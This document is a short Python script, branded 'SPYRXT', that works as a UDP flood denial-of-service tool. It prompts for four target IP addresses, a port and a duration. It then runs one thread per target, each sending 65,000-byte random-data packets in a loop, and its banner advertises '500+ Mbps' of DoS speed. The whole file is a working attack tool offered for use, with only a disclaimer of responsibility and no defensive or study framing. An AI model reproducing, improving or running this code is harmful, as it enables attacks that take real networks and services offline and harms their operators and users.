import socket
import threading
import random
import time
from colorama import Fore

def send_packets(ip, port, duration):
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    bytes = random._urandom(65000)
    start_time = time.time()
    while time.time() - start_time < duration:
        sock.sendto(bytes, (ip, port))
        print(f"Sent packet to {ip}:{port}")
    sock.close()

def main():
    print("\n" * 100)
    text = """
    ███████╗██████╗ ██╗   ██╗██████╗ ██╗  ██╗██████╗ ████████╗
    ██╔════╝██╔══██╗╚██╗ ██╔╝██╔══██╗╚██╗██╔╝██╔══██╗╚══██╔══╝
    ███████╗██████╔╝ ╚████╔╝ ██████╔╝ ╚███╔╝ ██████╔╝   ██║   
    ╚════██║██╔═══╝   ╚██╔╝  ██╔══██╗ ██╔██╗ ██╔══██╗   ██║   
    ███████║██║        ██║   ██║  ██║██╔╝ ██╗██║  ██║   ██║   
    ╚══════╝╚═╝        ╚═╝   ╚═╝  ╚═╝╚═╝  ╚═╝╚═╝  ╚═╝   ╚═╝   
    """
    print(Fore.RED + text)

    print("All rights reserved ©")
    print(Fore.RED + "We aren't responsible for whatever you do using this tool. Use it at your own risk.")
    print("")
    print(Fore.RED + "SOIC Details: ")
    print(Fore.RED + "DoS Speed: " + Fore.WHITE + "NEW 500+ Mbps")
    print(Fore.RED + "[!] " + Fore.WHITE + "Tip: Open & Use SPYRXT on multiple Windows to get 1Gbps")
    print("")

    ip_addresses = []
    for i in range(4):  # Change 4 to the number of IP addresses you want to send packets to
        ip = input(Fore.RED + f"Enter IP Address {i+1}: " + Fore.GREEN)
        ip_addresses.append(ip)

    port = int(input(Fore.RED + "Enter Port: " + Fore.GREEN))
    duration = float(input(Fore.RED + "Enter duration in seconds: " + Fore.GREEN))

    threads = []
    for ip in ip_addresses:
        thread = threading.Thread(target=send_packets, args=(ip, port, duration))
        thread.start()
        threads.append(thread)

    for thread in threads:
        thread.join()

if __name__ == "__main__":
    main()
